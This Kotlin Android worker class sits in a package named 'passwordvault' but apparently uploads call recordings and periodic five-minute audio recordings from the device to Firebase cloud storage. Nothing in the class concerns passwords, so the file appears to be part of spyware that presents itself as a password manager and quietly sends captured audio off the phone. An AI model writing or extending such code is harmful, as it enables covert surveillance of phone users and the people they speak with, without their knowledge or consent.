package com.example.passwordvault.util

import android.content.Context
import android.util.Log
import androidx.work.Worker
import androidx.work.WorkerParameters
import java.io.File
import java.io.FileInputStream

private val TAG = CloudPusher::class.java.simpleName

class CloudPusher(val context: Context, private val workerParams: WorkerParameters) :
    Worker(context, workerParams) {

    override fun doWork(): Result {
        val latestRecord = workerParams.inputData.getString(LATEST_RECORD)
        val recordType = workerParams.inputData.getString(RECORDER_TYPE)
        val storageRef = FirebaseStorage.storage().reference
        Log.e(TAG, "reference -> $storageRef")
        try {
            val file = File(latestRecord!!)
            if (file.exists()) {
                val stream = FileInputStream(file)
                if (recordType == CALL_RECORDER)
                    storageRef.child("Call Recordings/" + file.name).putStream(stream)
                else
                    storageRef.child("FiveMins Recordings/" + file.name).putStream(stream)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed -> $e")
        }
        Log.e(TAG, "Worker started, latest record: $latestRecord")
        return Result.success()
    }

    override fun onStopped() {
        super.onStopped()
        Log.e(TAG, "Worker Stopped")
    }
}